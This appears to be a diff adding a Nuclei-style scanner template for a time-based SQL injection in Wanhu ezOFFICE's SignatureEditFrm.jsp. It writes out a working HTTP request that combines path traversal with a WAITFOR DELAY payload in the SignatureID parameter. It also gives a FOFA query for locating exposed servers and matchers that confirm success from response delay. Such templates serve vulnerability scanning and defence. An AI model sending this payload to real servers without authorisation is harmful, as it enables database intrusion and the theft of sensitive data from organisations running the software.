@@ -1,0 +1,31 @@
+id: wanhu-ezoffice-SignatureEditFrms-sqli
+info:
+  name: 万户 ezoffice SignatureEditFrm - sqli
+  author: leadlife
+  severity: high
+  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台SignatureEditFrm.jsp存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7ezoffice%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0SignatureEditFrm%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: todo
+  tags: wanhu,oa,sqli,time,ezoffice
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+        Connection: close
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains(body,'印签')
+        condition: and
